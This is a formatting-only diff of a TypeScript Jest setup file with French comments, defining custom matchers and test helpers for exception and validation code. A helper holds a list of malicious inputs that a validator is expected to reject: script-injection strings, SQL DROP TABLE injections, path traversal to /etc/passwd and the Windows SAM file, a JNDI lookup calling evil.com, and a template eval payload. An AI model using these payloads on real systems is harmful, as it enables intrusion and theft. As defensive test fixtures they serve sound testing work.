@@ -2,7 +2,7 @@ import 'reflect-metadata';
 
 /**
  * Configuration de test spécifique pour les exceptions et utilitaires
- * 
+ *
  * Ce fichier configure l'environnement de test pour les composants
  * d'exceptions et de validation qui ne nécessitent pas de base de données
  * ou de services externes.
@@ -31,7 +31,7 @@ beforeAll(() => {
       originalConsoleError(message, ...args);
     }
   });
-  
+
   console.warn = jest.fn();
   console.log = jest.fn();
 });
@@ -62,19 +62,21 @@ expect.extend({
    * Vérifie qu'une exception a les propriétés d'audit attendues
    */
   toHaveAuditProperties(received: any, expectedProps: string[]) {
-    const pass = expectedProps.every(prop => 
-      received && typeof received === 'object' && prop in received
+    const pass = expectedProps.every(
+      (prop) => received && typeof received === 'object' && prop in received,
     );
-    
+
     if (pass) {
       return {
-        message: () => `Expected exception not to have audit properties ${expectedProps.join(', ')}`,
+        message: () =>
+          `Expected exception not to have audit properties ${expectedProps.join(', ')}`,
         pass: true,
       };
     } else {
-      const missingProps = expectedProps.filter(prop => !(prop in received));
+      const missingProps = expectedProps.filter((prop) => !(prop in received));
       return {
-        message: () => `Expected exception to have audit properties: ${missingProps.join(', ')}`,
+        message: () =>
+          `Expected exception to have audit properties: ${missingProps.join(', ')}`,
         pass: false,
       };
     }
@@ -84,11 +86,12 @@ expect.extend({
    * Vérifie qu'une validation retourne le bon format de résultat
    */
   toBeValidationResult(received: any) {
-    const hasRequiredProps = received && 
+    const hasRequiredProps =
+      received &&
       typeof received === 'object' &&
       typeof received.isValid === 'boolean' &&
       Array.isArray(received.errors);
-    
+
     if (hasRequiredProps) {
       return {
         message: () => `Expected not to be a validation result`,
@@ -96,7 +99,8 @@ expect.extend({
       };
     } else {
       return {
-        message: () => `Expected to be a validation result with isValid (boolean) and errors (array)`,
+        message: () =>
+          `Expected to be a validation result with isValid (boolean) and errors (array)`,
         pass: false,
       };
     }
@@ -107,15 +111,17 @@ expect.extend({
    */
   toInheritFrom(received: any, expectedParent: any) {
     const pass = received instanceof expectedParent;
-    
+
     if (pass) {
       return {
-        message: () => `Expected exception not to inherit from ${expectedParent.name}`,
+        message: () =>
+          `Expected exception not to inherit from ${expectedParent.name}`,
         pass: true,
       };
     } else {
       return {
-        message: () => `Expected exception to inherit from ${expectedParent.name}`,
+        message: () =>
+          `Expected exception to inherit from ${expectedParent.name}`,
         pass: false,
       };
     }
@@ -125,25 +131,26 @@ expect.extend({
    * Vérifie qu'un message ne contient pas d'informations sensibles
    */
   toNotContainSensitiveInfo(received: string, sensitiveTerms: string[]) {
-    const containsSensitive = sensitiveTerms.some(term => 
-      received && received.toLowerCase().includes(term.toLowerCase())
+    const containsSensitive = sensitiveTerms.some(
+      (term) => received && received.toLowerCase().includes(term.toLowerCase()),
     );
-    
+
     if (!containsSensitive) {
       return {
         message: () => `Expected message to contain sensitive information`,
         pass: true,
       };
     } else {
-      const foundTerms = sensitiveTerms.filter(term => 
-        received.toLowerCase().includes(term.toLowerCase())
+      const foundTerms = sensitiveTerms.filter((term) =>
+        received.toLowerCase().includes(term.toLowerCase()),
       );
       return {
-        message: () => `Expected message not to contain sensitive terms: ${foundTerms.join(', ')}`,
+        message: () =>
+          `Expected message not to contain sensitive terms: ${foundTerms.join(', ')}`,
         pass: false,
       };
     }
-  }
+  },
 });
 
 // Déclaration des types pour les matchers personnalisés
@@ -219,16 +226,16 @@ export class TestHelpers {
    * Vérifie que les propriétés readonly ne peuvent pas être modifiées
    */
   static testReadonlyProperties(instance: any, properties: string[]): void {
-    properties.forEach(prop => {
+    properties.forEach((prop) => {
       const originalValue = instance[prop];
-      
+
       // Tentative de modification (devrait être ignorée en readonly)
       try {
         instance[prop] = 'modified_value';
       } catch (error) {
         // C'est normal que ça lance une erreur en strict mode
       }
-      
+
       // La valeur ne devrait pas avoir changé
       expect(instance[prop]).toBe(originalValue);
     });
@@ -239,11 +246,11 @@ export class TestHelpers {
    */
   static testJSONSerialization(instance: any): void {
     expect(() => JSON.stringify(instance)).not.toThrow();
-    
+
     const serialized = JSON.stringify(instance);
     expect(serialized).toBeDefined();
     expect(serialized.length).toBeGreaterThan(0);
-    
+
     const parsed = JSON.parse(serialized);
     expect(parsed).toBeDefined();
     expect(typeof parsed).toBe('object');
@@ -252,11 +259,15 @@ export class TestHelpers {
   /**
    * Teste la performance d'une fonction avec des données volumineuses
    */
-  static testPerformance(fn: Function, args: any[], expectedMaxTime: number = 100): void {
+  static testPerformance(
+    fn: Function,
+    args: any[],
+    expectedMaxTime: number = 100,
+  ): void {
     const start = Date.now();
     fn(...args);
     const duration = Date.now() - start;
-    
+
     expect(duration).toBeLessThan(expectedMaxTime);
   }
 
@@ -283,7 +294,7 @@ export class TestHelpers {
       'javascript:alert(1)',
       'data:text/html,<script>alert(1)</script>',
       '"; DROP TABLE users; --',
-      '\'; DROP TABLE projects; --',
+      "'; DROP TABLE projects; --",
       '../../../etc/passwd',
       '..\\..\\..\\windows\\system32\\config\\sam',
       '${jndi:ldap://evil.com/a}',
@@ -291,10 +302,10 @@ export class TestHelpers {
       '<%- eval(request.params.id) %>',
     ];
 
-    injectionAttempts.forEach(maliciousInput => {
+    injectionAttempts.forEach((maliciousInput) => {
       expect(() => validationFn(maliciousInput)).not.toThrow();
       const result = validationFn(maliciousInput);
-      
+
       // Le résultat ne devrait jamais être valide pour ces entrées
       if (typeof result === 'boolean') {
         expect(result).toBe(false);
